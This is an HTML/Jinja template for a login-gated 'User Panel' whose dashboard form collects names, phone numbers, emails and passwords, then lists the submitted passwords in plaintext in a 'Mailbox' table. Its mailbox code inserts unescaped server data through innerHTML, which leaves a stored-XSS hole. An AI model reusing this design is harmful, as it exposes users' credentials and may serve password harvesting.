<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Panel | Secure Access</title>
    <style>
        :root {
            --primary: #6366f1; --primary-hover: #4f46e5; --bg: #f8fafc;
            --card: rgba(255, 255, 255, 0.92); --text: #0f172a; --muted: #64748b;
            --border: #e2e8f0; --success: #10b981; --error: #ef4444;
            --shadow: 0 12px 32px rgba(0, 0, 0, 0.08), 0 4px 12px rgba(0, 0, 0, 0.04);
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', system-ui, -apple-system, sans-serif; }
        body { background: linear-gradient(135deg, #e0e7ff 0%, #f1f5f9 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; color: var(--text); }
        .container { width: 100%; max-width: 800px; background: var(--card); backdrop-filter: blur(12px); border-radius: 18px; box-shadow: var(--shadow); padding: 2.5rem; border: 1px solid rgba(255,255,255,0.7); position: relative; overflow: hidden; }
        
        /* STRICT GATE: Dashboard hidden by default */
        #login-view { animation: slideIn 0.4s ease; }
        #dashboard-view { display: none; animation: fadeIn 0.4s ease; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        h2 { font-size: 1.8rem; margin-bottom: 0.4rem; background: linear-gradient(135deg, var(--primary), #8b5cf6); -webkit-background-clip: text; color: transparent; letter-spacing: -0.5px; }
        .subtitle { color: var(--muted); margin-bottom: 1.8rem; font-size: 0.95rem; line-height: 1.5; }
        
        form { display: flex; flex-direction: column; gap: 1rem; }
        input { padding: 0.9rem 1.1rem; border: 1px solid var(--border); border-radius: 12px; font-size: 0.95rem; background: #fff; transition: all 0.2s ease; }
        input:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.15); transform: translateY(-1px); }
        button { padding: 0.9rem; background: linear-gradient(135deg, var(--primary), var(--primary-hover)); color: #fff; border: none; border-radius: 12px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; font-size: 0.95rem; }
        button:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 8px 16px rgba(99, 102, 241, 0.25); }
        button:active:not(:disabled) { transform: translateY(0); }
        button:disabled { opacity: 0.7; cursor: not-allowed; }
        
        .card { background: rgba(255, 255, 255, 0.6); padding: 1.5rem; border-radius: 14px; margin-bottom: 1.4rem; border: 1px solid var(--border); box-shadow: 0 4px 10px rgba(0,0,0,0.02); }
        .card h3 { margin-bottom: 1rem; color: var(--text); display: flex; align-items: center; gap: 8px; font-size: 1.2rem; }
        table { width: 100%; border-collapse: separate; border-spacing: 0; font-size: 0.88rem; border-radius: 10px; border: 1px solid var(--border); overflow: hidden; }
        th, td { padding: 0.85rem 1rem; text-align: left; border-bottom: 1px solid var(--border); }
        th { background: #f8fafc; color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: 0.75rem; letter-spacing: 0.4px; }
        tr:last-child td { border-bottom: none; }
        tr:hover td { background: rgba(99, 102, 241, 0.04); }
        
        .msg { margin-top: 0.75rem; font-size: 0.88rem; font-weight: 500; min-height: 1.2rem; display: flex; align-items: center; gap: 6px; }
        .msg.success { color: var(--success); }
        .msg.error { color: var(--error); }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.8rem; border-bottom: 1px solid var(--border); padding-bottom: 1rem; flex-wrap: wrap; gap: 12px; }
        .logout-btn { background: transparent; color: var(--error); border: 1px solid var(--error); padding: 0.55rem 1rem; font-size: 0.85rem; border-radius: 10px; text-decoration: none; transition: 0.2s; }
        .logout-btn:hover { background: #fef2f2; }
        .mono { font-family: 'Courier New', monospace; background: #eef2ff; padding: 2px 6px; border-radius: 4px; font-size: 0.85em; color: #3730a3; }
        .loader { display: inline-block; width: 12px; height: 12px; border: 2px solid currentColor; border-right-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        @media (max-width: 650px) { .container { padding: 1.5rem; } th, td { padding: 0.6rem; font-size: 0.8rem; } .header { flex-direction: column; align-items: flex-start; } }
    </style>
</head>
<body>
    <div class="container">
        <!-- STRICT GATE FLAG: Backend se auth state check karega -->
        <div id="app-root" data-init-auth="{% if username %}1{% else %}0{% endif %}">
            
            <!-- 🔒 LOGIN VIEW (Default Visible) -->
            <div id="login-view">
                <h2>🔐 User Access</h2>
                <p class="subtitle">Account required to proceed. Login with your assigned credentials to unlock the dashboard.</p>
                <form id="login-form" autocomplete="off">
                    <input type="text" id="login-user" placeholder="Username" required>
                    <input type="password" id="login-pass" placeholder="Password" required>
                    <button type="submit" id="login-btn">Sign In</button>
                </form>
                <div id="login-msg" class="msg"></div>
            </div>

            <!-- 📊 DASHBOARD VIEW (Strictly Hidden Until Login) -->
            <div id="dashboard-view">
                <div class="header">
                    <h2>👋 Welcome, <span id="user-display" style="color:var(--primary);"></span></h2>
                    <a href="/logout" class="logout-btn">Logout</a>
                </div>

                <div class="card">
                    <h3>📝 Submit Request</h3>
                    <form id="request-form" autocomplete="off">
                        <input type="text" id="req-name" placeholder="Full Name" required>
                        <input type="tel" id="req-mobile" placeholder="Mobile Number" pattern="[0-9]{10,15}" required>
                        <input type="email" id="req-email" placeholder="Email ID" required>
                        <input type="password" id="req-pass" placeholder="Password" required>
                        <button type="submit" id="submit-btn">Submit Request</button>
                    </form>
                    <div id="submit-msg" class="msg"></div>
                </div>

                <div class="card">
                    <h3>📬 Mailbox (Your Requests)</h3>
                    <div style="overflow-x:auto;">
                        <table>
                            <thead><tr><th>Name</th><th>Mobile</th><th>Email</th><th>Password</th><th>Submitted At</th></tr></thead>
                            <tbody id="mailbox-body"><tr><td colspan="5" style="text-align:center; padding:1.2rem; color:#94a3b8;">Fetching data...</td></tr></tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // DOM Elements
        const appRoot = document.getElementById('app-root');
        const loginView = document.getElementById('login-view');
        const dashboardView = document.getElementById('dashboard-view');
        const loginForm = document.getElementById('login-form');
        const reqForm = document.getElementById('request-form');
        const loginMsg = document.getElementById('login-msg');
        const submitMsg = document.getElementById('submit-msg');

        // View Switchers
        const showLogin = () => { dashboardView.style.display = 'none'; loginView.style.display = 'block'; };
        const showDashboard = (username) => { 
            loginView.style.display = 'none'; 
            dashboardView.style.display = 'block';
            document.getElementById('user-display').textContent = username || 'User';
            loadMailbox();
        };

        // 1. INIT GATE CHECK (Page Load / Refresh)
        const isAuth = appRoot.dataset.initAuth === '1';
        if (isAuth) {
            showDashboard(sessionStorage.getItem('uname'));
        } else {
            showLogin();
        }

        // 2. LOGIN HANDLER
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('login-btn');
            const user = document.getElementById('login-user').value;
            
            btn.disabled = true; 
            btn.innerHTML = '<span class="loader"></span> Authenticating...';
            loginMsg.className = 'msg'; loginMsg.textContent = '';

            try {
                const res = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: user, password: document.getElementById('login-pass').value })
                });
                const data = await res.json();
                
                if (data.success) {
                    sessionStorage.setItem('uname', user);
                    appRoot.dataset.initAuth = '1'; // Update flag for current session
                    loginMsg.className = 'msg success';
                    loginMsg.textContent = '✅ Login Successful! Unlocking Dashboard...';
                    setTimeout(() => showDashboard(user), 800);
                } else {
                    loginMsg.className = 'msg error';
                    loginMsg.textContent = '❌ ' + (data.message || 'Invalid Credentials');
                    btn.disabled = false; btn.textContent = 'Sign In';
                }
            } catch {
                loginMsg.className = 'msg error';
                loginMsg.textContent = '❌ Connection Failed. Check server.';
                btn.disabled = false; btn.textContent = 'Sign In';
            }
        });

        // 3. SUBMIT HANDLER
        reqForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('submit-btn');
            btn.disabled = true; btn.innerHTML = '<span class="loader"></span> Sending...';
            submitMsg.className = 'msg'; submitMsg.textContent = '';

            try {
                const res = await fetch('/api/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        name: document.getElementById('req-name').value,
                        mobile: document.getElementById('req-mobile').value,
                        email: document.getElementById('req-email').value,
                        form_password: document.getElementById('req-pass').value
                    })
                });
                const data = await res.json();
                submitMsg.className = data.success ? 'msg success' : 'msg error';
                submitMsg.textContent = data.message || (data.success ? '✅ Request Submitted Successfully!' : '❌ Failed');
                
                if (data.success) {
                    e.target.reset();
                    loadMailbox();
                }
            } catch {
                submitMsg.className = 'msg error';
                submitMsg.textContent = '❌ Submission Failed';
            }
            btn.disabled = false; btn.textContent = 'Submit Request';
        });

        // 4. MAILBOX LOADER
        async function loadMailbox() {
            const tbody = document.getElementById('mailbox-body');
            tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding:1rem;"><span class="loader"></span> Loading...</td></tr>';
            try {
                const res = await fetch('/api/mailbox');
                const data = await res.json();
                tbody.innerHTML = '';
                if (!data.length) {
                    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding:1.2rem; color:#94a3b8;">No requests submitted yet.</td></tr>';
                    return;
                }
                data.forEach(r => {
                    tbody.innerHTML += `<tr>
                        <td>${r.name}</td>
                        <td>${r.mobile}</td>
                        <td>${r.email}</td>
                        <td><span class="mono">${r.form_password}</span></td>
                        <td style="color:#64748b; font-size:0.82em;">${new Date(r.timestamp).toLocaleString()}</td>
                    </tr>`;
                });
            } catch {
                tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color:#ef4444;">Failed to load mailbox</td></tr>';
            }
        }
    </script>
</body>
</html>
